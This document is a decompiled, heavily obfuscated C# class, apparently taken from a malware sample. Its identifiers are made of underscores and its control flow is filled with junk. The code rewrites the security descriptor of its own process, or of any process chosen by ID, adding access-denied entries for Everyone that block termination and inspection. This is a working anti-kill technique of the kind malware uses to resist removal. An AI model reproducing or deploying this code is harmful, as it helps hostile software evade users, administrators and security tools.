using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.VisualBasic.CompilerServices;

internal class ______________________________________________________________________________
{
	[Flags]
	public enum _______________________________________________________________________________
	{
		_ = 0xF0FFF
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetCurrentProcess();

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr intptr_0, int int_0, [In] byte[] byte_0);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr intptr_0, int int_0, [Out] byte[] byte_0, uint uint_0, ref uint uint_1);

	public static void ____()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = ______(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(987135), new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(4096), new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			_______(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void _____(int int_0)
	{
		try
		{
			IntPtr handle = Process.GetProcessById(int_0).Handle;
			RawSecurityDescriptor rawSecurityDescriptor = ______(handle);
			switch (sizeof(ulong))
			{
			}
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(987135), new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(4096), new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			_______(handle, rawSecurityDescriptor);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static RawSecurityDescriptor ______(IntPtr intptr_0)
	{
		RawSecurityDescriptor result = default(RawSecurityDescriptor);
		try
		{
			byte[] gparam_ = new byte[0];
			uint uint_ = 0u;
			GetKernelObjectSecurity(intptr_0, 4, gparam_, 0u, ref uint_);
			int _________ = _003CModule_003E.__________;
			if (((true ? 1u : 0u) & (uint)((3395 + _________) ^ (_________ + -7957))) != 0)
			{
				switch ((((uint_ * 32768) ^ 0x14F3) == 0) ? (sizeof(ushort) + 1938339977) : (sizeof(int) + 1747541202))
				{
				}
			}
			if ((long)uint_ >= 0L && (long)uint_ <= 32767L)
			{
				if (!GetKernelObjectSecurity(intptr_0, 4, ________(ref gparam_, new byte[(int)((long)uint_ - 1L) + 1]), uint_, ref uint_))
				{
					throw new Win32Exception();
				}
				result = new RawSecurityDescriptor(gparam_, 0);
				return result;
			}
			throw new Win32Exception();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void _______(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		byte[] array = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				nint num5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 152:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0047;
						case 4:
							goto IL_0053;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0047:
					num = 3;
					rawSecurityDescriptor_0.GetBinaryForm(array, 0);
					goto IL_0053;
					IL_0008:
					_003CModule_003E.___________ = 1657774894;
					num = 2;
					num5 = (nint)Type.EmptyTypes.LongLength + 1;
					while (true)
					{
						switch (num5)
						{
						default:
							goto IL_001f;
						case 0:
							break;
						}
						break;
						IL_001f:
						array = new byte[rawSecurityDescriptor_0.BinaryLength - 1 + 1];
						num5 = (nint)Type.EmptyTypes.LongLength + 0;
					}
					goto IL_0047;
					IL_0053:
					num = 4;
					if (SetKernelObjectSecurity(intptr_0, 4, array))
					{
						goto end_IL_0000_3;
					}
					break;
					end_IL_0000_2:
					break;
				}
				num = 5;
				throw new Win32Exception();
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 152;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static @_ ________<_>(ref @_ gparam_0, @_ gparam_1)
	{
		gparam_0 = gparam_1;
		return gparam_1;
	}
}
